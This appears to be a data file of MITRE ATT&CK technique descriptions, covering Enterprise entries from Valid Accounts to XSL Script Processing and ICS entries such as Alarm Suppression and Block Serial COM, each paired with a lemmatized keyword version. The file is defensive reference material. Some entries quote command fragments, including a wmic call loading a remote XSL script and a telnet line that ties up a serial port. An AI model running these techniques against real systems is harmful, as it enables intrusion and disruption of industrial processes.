T1078,Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.",adversary obtain abuse credential exist account means gain initial access persistence privilege escalation defense evasion compromised credential bypass access control place resource system network persistent access remote system externally available service vpn outlook web access network device remote desktop compromised credential grant adversary increase privilege specific system access restricted area network adversary choose use malware tool conjunction legitimate access credential provide hard detect presence case adversary abuse inactive account example belong individual long organization account allow adversary evade detection original account user present identify anomalous activity take place account overlap permission local domain cloud account network system concern adversary able pivot account system reach high level access domain enterprise administrator bypass access control set enterprise
T1078.001,Valid Accounts: Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.",adversary obtain abuse credential default account means gain initial access persistence privilege escalation defense evasion default account build os guest administrator account windows system default account include default factory provider set account type system software device include root user account aws default service account kubernetes default account limit client machine include account preset equipment network device computer application internal open source commercial appliance come preset username password combination pose threat organization change post installation easy target adversary similarly adversary utilize publicly disclose steal private keys credential material legitimately connect remote environment remote services
T1078.002,Valid Accounts: Domain Accounts,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",adversary obtain abuse credential domain account means gain initial access persistence privilege escalation defense evasion adversary compromise domain account high level privilege mean os credential dumping password reuse allow access privileged resource domain
T1078.003,Valid Accounts: Local Accounts,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",adversary obtain abuse credential local account means gain initial access persistence privilege escalation defense evasion local account configure organization use user remote support service administration single system service local account abuse elevate privilege harvest credential os credential dumping password reuse allow abuse local account set machine network purpose privilege escalation lateral movement
T1078.004,Valid Accounts: Cloud Accounts,"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management systems, such as Windows Active Directory.Compromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a Trusted Relationship. Similar to Domain Accounts, compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.Once a cloud account is compromised, an adversary may perform Account Manipulation - for example, by adding Additional Cloud Roles - to maintain persistence and potentially escalate their privileges.",adversary obtain abuse credential cloud account means gain initial access persistence privilege escalation defense evasion cloud account create configure organization use user remote support service administration resource cloud service provider saas application case cloud account federate traditional identity management system windows active directory compromised credential cloud account harvest sensitive datum online storage account database access cloud account abuse gain initial access network abuse trusted relationship similar domain accounts compromise federated cloud account allow adversary easily laterally environment cloud account compromise adversary perform account manipulation example add additional cloud role maintain persistence potentially escalate privilege
T1125,Video Capture,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.",adversary leverage computer peripheral device integrated camera webcam application video service capture video recording purpose gather information image capture device application potentially specify interval lieu video file malware script interact device available api provide operate system application capture video image video image file write disk exfiltrate later technique differ screen capture use specific device application video recording capture victim screen macos different malware sample record user webcam fruitfly proton
T1497,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",adversary employ mean detect avoid virtualization analysis environment include change behavior base result check presence artifact indicative virtual machine environment vme sandbox adversary detect vme alter malware disengage victim conceal core function implant search vme artifact drop secondary additional payload adversary use information learn virtualization sandbox evasion automate discovery shape follow behavior adversary use method accomplish virtualization sandbox evasion check security monitoring tool sysinternals wireshark etc system artifact associate analysis virtualization adversary check legitimate user activity help determine analysis environment additional method include use sleep timer loop malware code avoid operate temporary sandbox
T1497.001,Virtualization/Sandbox Evasion: System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",adversary employ system check detect avoid virtualization analysis environment include change behavior base result check presence artifact indicative virtual machine environment vme sandbox adversary detect vme alter malware disengage victim conceal core function implant search vme artifact drop secondary additional payload adversary use information learn virtualization sandbox evasion automate discovery shape follow behavior specific check vary base target adversary involve behavior windows management instrumentation powershell system information discovery query registry obtain system information search vme artifact adversary search vme artifact memory process file system hardware registry adversary use scripting automate check script program exit determine system virtual environment check include generic system property host domain sample network traffic adversary check network adapter address cpu core count available memory drive size common check enumerate service run unique application instal program system manufacturer product field string relate virtual machine application vme specific hardware processor instruction application like vmware adversary use special o port send command receive output hardware check presence fan temperature audio device gather evidence indicative virtual environment adversary query specific reading device
T1497.002,Virtualization/Sandbox Evasion: User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks",adversary employ user activity check detect avoid virtualization analysis environment include change behavior base result check presence artifact indicative virtual machine environment vme sandbox adversary detect vme alter malware disengage victim conceal core function implant search vme artifact drop secondary additional payload adversary use information learn virtualization sandbox evasion automate discovery shape follow behavior adversary search user activity host base variable speed frequency mouse movement click
T1497.003,Virtualization/Sandbox Evasion: Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",adversary employ time base method detect avoid virtualization analysis environment include enumerate time base property uptime system clock use timer trigger avoid virtual machine environment vme sandbox specifically automated operate limited time adversary employ time base evasion delay malware functionality initial execution programmatic sleep command native system scheduling functionality ex schedule task job delay base wait specific victim condition meet ex system time event etc employ schedule multi stage channels avoid analysis scrutiny benign command operation delay malware execution loop needless repetition command ping delay malware execution potentially exceed time threshold automate analysis environment adversary use time metric detect sandbox analysis environment particularly attempt manipulate time mechanism simulate long elapse time example adversary able identify sandbox accelerate time sample calculate expect value environment timestamp execution sleep function
T1600,Weaken Encryption,"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as Modify System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.",adversary compromise network device encryption capability order bypass encryption protect datum communication encryption protect transmit network traffic maintain confidentiality protect unauthorized disclosure integrity protect unauthorized change encryption cipher convert plaintext message ciphertext computationally intensive decipher associate decryption key typically long key increase cost cryptanalysis decryption key adversary compromise manipulate device perform encryption network traffic example behavior modify system image reduce key space disable crypto hardware adversary negatively effect eliminate device ability securely encrypt network traffic pose great risk unauthorized disclosure help facilitate data manipulation credential access collection effort
T1600.001,Weaken Encryption: Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.",adversary reduce level effort require decrypt datum transmit network reduce cipher strength encrypt communication adversary weaken encryption software compromise network device reduce key size software convert plaintext ciphertext hundred thousand byte couple byte result adversary dramatically reduce effort need decrypt protect information key adversary modify key size encryption parameter specialized command network device cli introduce system modify system image change configuration device
T1600.002,Weaken Encryption: Disable Crypto Hardware,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).",adversary disable network device dedicated hardware encryption enable leverage weakness software encryption order reduce effort involve collect manipulate exfiltrate transmit datum network device router switch firewall perform encryption network traffic secure transmission network device equip special dedicated encryption hardware greatly increase speed encryption process prevent malicious tampering adversary take control device disable dedicated hardware example use modify system image force use software perform encryption general processor typically conjunction attack weaken strength cipher software reduce key space
T1102,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",adversary use exist legitimate external web service means relay datum compromised system popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection use web service protect end infrastructure discovery malware binary analysis enable operational resiliency infrastructure dynamically change
T1102.001,Web Service: Dead Drop Resolver,"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",adversary use exist legitimate external web service host information point additional command control infrastructure adversary post content know dead drop resolver web service embed obfuscate encode domain ip address infect victim reach redirect resolver popular website social media act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection use dead drop resolver protect end infrastructure discovery malware binary analysis enable operational resiliency infrastructure dynamically change
T1102.002,Web Service: Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",adversary use exist legitimate external web service means send command receive output compromised system web service channel compromised system leverage popular website social medium host command control instruction infected system send output command web service channel return traffic occur variety way depend web service utilize example return traffic form compromised system post comment forum issue pull request development project update document host web service send tweet popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection
T1102.003,Web Service: One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",adversary use exist legitimate external web service means send command compromised system receive return output web service channel compromised system leverage popular website social medium host command control instruction infected system opt send output command different channel include distinct web service alternatively compromised system return output case adversary want send instruction system want response popular website social medium act mechanism significant cover likelihood host network communicate prior compromise common service offer google twitter make easy adversary hide expected noise web service provider commonly use ssl tls encryption give adversary add level protection
T1047,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model (DCOM) and Windows Remote Management (WinRM).An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.",adversary abuse windows management instrumentation wmi execute malicious command payload wmi administration feature provide uniform environment access windows system component wmi service enable local remote access facilitate remote services distributed component object model dcom windows remote management adversary use wmi interact local remote system use means execute behavior gather information discovery remote execution file lateral movement
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) Command-line examples:msxsl.exe customersxsl msxsl.exe scriptxsl msxsl.exe scriptjpegAnother variation of this technique, dubbed ""Squiblytwo"", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.Command-line examples:Local File: wmic process list /FORMAT:evilxsl Remote File: wmic os get /FORMAT:""httpsxsl""",adversary bypass application control obscure execution code embed script inside xsl file extensible stylesheet language xsl file commonly describe processing rendering datum xml file support complex operation xsl standard include support embed scripting language adversary abuse functionality execute arbitrary file potentially bypass application control similar trusted developer utilities proxy execution microsoft common line transformation utility binary command line example customersxsl scriptxsl scriptjpeganother variation technique dub squiblytwo involve windows management instrumentation invoke jscript vbscript xsl file command line example local file wmic process list evilxsl remote file wmic os
T0800,Activate Firmware Update Mode,"Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction. For example, devices such as protection relays may have an operation mode designed for firmware installation. This mode may halt process monitoring and related functions to allow new firmware to be loaded. A device left in update mode may be placed in an inactive holding state if no firmware is provided to it. By entering and leaving a device in this mode, the adversary may deny its usual functionalities.",adversary activate firmware update mode device prevent expected response function engage reaction emergency process malfunction example device protection relay operation mode design firmware installation mode halt process monitoring related function allow new firmware load device leave update mode place inactive holding state firmware provide enter leave device mode adversary deny usual functionality
T0830,Adversary-in-the-Middle,"Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks. An AiTM attack may allow an adversary to perform the following attacks:Block Reporting Message, Spoof Reporting Message, Modify Parameter, Unauthorized Command Message",adversary privileged network access seek modify network traffic real time adversary middle aitm attack aitm attack allow adversary perform following attack block reporting message spoof reporting message modify parameter unauthorized command message
T0878,Alarm Suppression,"Adversaries may target protection function alarms to prevent them from notifying operators of critical conditions. Alarm messages may be a part of an overall reporting system and of particular interest for adversaries. Disruption of the alarm system does not imply the disruption of the reporting system as a whole.A Secura presentation on targeting OT notes a dual fold goal for adversaries attempting alarm suppression: prevent outgoing alarms from being raised and prevent incoming alarms from being responded to. The method of suppression may greatly depend on the type of alarm in question: An alarm raised by a protocol message An alarm signaled with I/O An alarm bit set in a flag (and read)In ICS environments, the adversary may have to suppress or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. Methods of suppression may involve tampering or altering device displays and logs, modifying in memory code to fixed values, or even tampering with assembly level instruction code.",adversary target protection function alarm prevent notify operator critical condition alarm message overall reporting system particular interest adversary disruption alarm system imply disruption reporting system secura presentation target ot note dual fold goal adversary attempt alarm suppression prevent outgoing alarm raise prevent incoming alarm respond method suppression greatly depend type alarm question alarm raise protocol message alarm signal o alarm bit set flag ics environment adversary suppress contend multiple alarm alarm propagation achieve specific goal evade detection prevent intended response occur method suppression involve tamper alter device display log modify memory code fix value tamper assembly level instruction code
T0802,Automated Collection,"Adversaries may automate collection of industrial environment information using tools or scripts. This automated collection may leverage native control protocols and tools available in the control systems environment. For example, the OPC protocol may be used to enumerate and gather information. Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.",adversary automate collection industrial environment information tool script automate collection leverage native control protocol tool available control system environment example opc protocol enumerate gather information access system interface native protocol allow collection enumeration attach communicate server device
T0803,Block Command Message,"Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition.",adversary block command message reach intended target prevent command execution ot network command message send provide instruction control system device block command message inhibit response function correct disruption unsafe condition
T0804,Block Reporting Message,"Adversaries may block or prevent a reporting message from reaching its intended target. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. By blocking these reporting messages, an adversary can potentially hide their actions from an operator.Blocking reporting messages in control systems that manage physical processes may contribute to system impact, causing inhibition of a response function. A control system may not be able to respond in a proper or timely manner to an event, such as a dangerous fault, if its corresponding reporting message is blocked.",adversary block prevent reporting message reach intended target control system reporting message contain telemetry datum o value pertain current state equipment industrial process block reporting message adversary potentially hide action operator block reporting message control system manage physical process contribute system impact cause inhibition response function control system able respond proper timely manner event dangerous fault corresponding reporting message block
T0805,Block Serial COM,"Adversaries may block access to serial COM to prevent instructions or configurations from reaching target devices. Serial Communication ports (COM) allow communication with control system devices. Devices can receive command and configuration messages over such serial COM. Devices also use serial COM to send command and reporting messages. Blocking device serial COM may also block command messages and block reporting messages. A serial to Ethernet converter is often connected to a serial COM to facilitate communication between serial and Ethernet devices. One approach to blocking a serial COM would be to create and hold open a TCP session with the Ethernet side of the converter. A serial to Ethernet converter may have a few ports open to facilitate multiple communications. For example, if there are three serial COM available -- 1, 2 and 3 --, the converter might be listening on the corresponding ports 20001, 20002, and 20003. If a TCP/IP connection is opened with one of these ports and held open, then the port will be unavailable for use by another party. One way the adversary could achieve this would be to initiate a TCP session with the serial to Ethernet converter at 10.0.0.1 via Telnet on serial port 1 with the following command: telnet 10.0.0.1 20001.",adversary block access serial com prevent instruction configuration reach target device serial communication port com allow communication control system device device receive command configuration message serial com device use serial com send command reporting message block device serial com block command message block reporting message serial ethernet converter connect serial com facilitate communication serial ethernet device approach block serial com create hold open tcp session ethernet converter serial ethernet converter port open facilitate multiple communication example serial com available converter listen corresponding port tcp ip connection open port hold open port unavailable use party way adversary achieve initiate tcp session serial ethernet converter telnet serial port following command telnet
T0806,Brute Force I/O,"Adversaries may repetitively or successively change I/O point values to perform an action. Brute Force I/O may be achieved by changing either a range of I/O point values or a single point value repeatedly to manipulate a process function. The adversary's goal and the information they have about the target environment will influence which of the options they choose. In the case of brute forcing a range of point values, the adversary may be able to achieve an impact without targeting a specific point. In the case where a single point is targeted, the adversary may be able to generate instability on the process function associated with that particular point. Adversaries may use Brute Force I/O to cause failures within various industrial processes. These failures could be the result of wear on equipment or damage to downstream equipment.",adversary repetitively successively change o point value perform action brute force o achieve change range o point value single point value repeatedly manipulate process function adversary goal information target environment influence option choose case brute force range point value adversary able achieve impact target specific point case single point target adversary able generate instability process function associate particular point adversary use brute force o cause failure industrial process failure result wear equipment damage downstream equipment
T0892,Change Credential,"Adversaries may modify software and device credentials to prevent operator and responder access. Depending on the device, the modification or addition of this password could prevent any device configuration actions from being accomplished and may require a factory reset or replacement of hardware. These credentials are often built-in features provided by the device vendors as a means to restrict access to management interfaces.An adversary with access to valid or hardcoded credentials could change the credential to prevent future authorized device access. Change Credential may be especially damaging when paired with other techniques such as Modify Program, Data Destruction, or Modify Controller Tasking. In these cases, a device’s configuration may be destroyed or include malicious actions for the process environment, which cannot not be removed through normal device configuration actions. Additionally, recovery of the device and original configuration may be difficult depending on the features provided by the device. In some cases, these passwords cannot be removed onsite and may require that the device be sent back to the vendor for additional recovery steps.A chain of incidents occurred in Germany, where adversaries locked operators out of their building automation system (BAS) controllers by enabling a previously unset BCU key.",adversary modify software device credential prevent operator responder access depend device modification addition password prevent device configuration action accomplish require factory reset replacement hardware credential build feature provide device vendor means restrict access management interface adversary access valid hardcode credential change credential prevent future authorize device access change credential especially damaging pair technique modify program data destruction modify controller tasking case device configuration destroy include malicious action process environment remove normal device configuration action additionally recovery device original configuration difficult depend feature provide device case password remove onsite require device send vendor additional recovery step chain incident occur germany adversary lock operator building automation system bas controller enable previously unset bcu key
T0858,Change Operating Mode,"Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download. Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below: Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. Program Upload and Program Download are disabled while in this mode. Remote - Allows for remote changes to a PLCs operation mode. Stop - The PLC and program is stopped, while in this mode, outputs are forced off. Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization.",adversary change operating mode controller gain additional access engineering function program download programmable controller typically mode operation control state user program control access controller api operating mode physically select key switch face controller select call controller api operating mode mechanism select vary vendor product line commonly implement operating mode describe program mode enable change device program allow program upload download device engineering workstation plcs logic halt output force run execution device program occur mode input output value point tag element etc monitor accord program logic program upload program download disable mode remote allow remote change plcs operation mode stop plc program stop mode output force reset condition plc reset original state warm reset retain memory cold reset reset o datum register test monitor mode similar run mode o process mode allow monitoring force set reset generally tuning debugging system monitor mode trial initialization
T0807,Command-Line Interface,"Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments. Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP. Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context. Many controllers have CLI interfaces for management purposes.",adversary utilize command line interface clis interact system execute command clis provide means interact computer system common feature type platform device control system environment adversary use clis install run new software include malicious tool instal course operation cli typically access locally expose service ssh telnet rdp command execute cli execute current permission level process run terminal emulator command specify change permission context controller cli interface management purpose
T0885,Commonly Used Port,"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection. They may use the protocol associated with the port, or a completely different protocol. They may use commonly open ports, such as the examples provided below. TCP:80 (HTTP) TCP:443 (HTTPS) TCP/UDP:53 (DNS) TCP:1024-4999 (OPC on XP/Win2k3) TCP:49152-65535 (OPC on Vista and later) TCP:23 (TELNET) UDP:161 (SNMP) TCP:502 (MODBUS) TCP:102 (S7comm/ISO-TSAP) TCP:20000 (DNP3) TCP:44818 (Ethernet/IP)",adversary communicate commonly port bypass firewall network detection system blend normal network activity avoid detailed inspection use protocol associate port completely different protocol use commonly open port example provide http https tcp dns opc xp opc vista later telnet snmp modbus iso tsap ethernet ip
T0884,Connection Proxy,"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.The definition of a proxy can also be expanded to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.The network may be within a single organization or across multiple organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.",adversary use connection proxy direct network traffic system act intermediary network communication definition proxy expand encompass trust relationship network peer peer mesh trusted connection network consist host system regularly communicate network single organization multiple organization trust relationship adversary use type relationship manage command control communication reduce number simultaneous outbound network connection provide resiliency face connection loss ride exist trust communication path victim avoid suspicion
T0879,Damage to Property,"Adversaries may cause damage and destruction of property to infrastructure, equipment, and the surrounding environment when attacking control systems. This technique may result in device and operational equipment breakdown, or represent tangential damage from other techniques used in an attack. Depending on the severity of physical damage and disruption caused to control processes and systems, this technique may result in Loss of Safety. Operations that result in Loss of Control may also cause damage to property, which may be directly or indirectly motivated by an adversary seeking to cause impact in the form of Loss of Productivity and Revenue. The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill under an incidents affecting business section of its 2014 IT Security Report. These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact and damage resulted from the uncontrolled shutdown of a blast furnace. A Polish student used a remote controller device to interface with the Lodz city tram system in Poland.",adversary cause damage destruction property infrastructure equipment surround environment attack control system technique result device operational equipment breakdown represent tangential damage technique attack depend severity physical damage disruption cause control process system technique result loss safety operation result loss control cause damage property directly indirectly motivate adversary seek cause impact form loss productivity revenue german federal office information security bsi report target attack steel mill incident affect business section security report target attack affect industrial operation result breakdown control system component entire installation result breakdown massive impact damage result uncontrolled shutdown blast furnace polish student remote controller device interface lodz city tram system poland
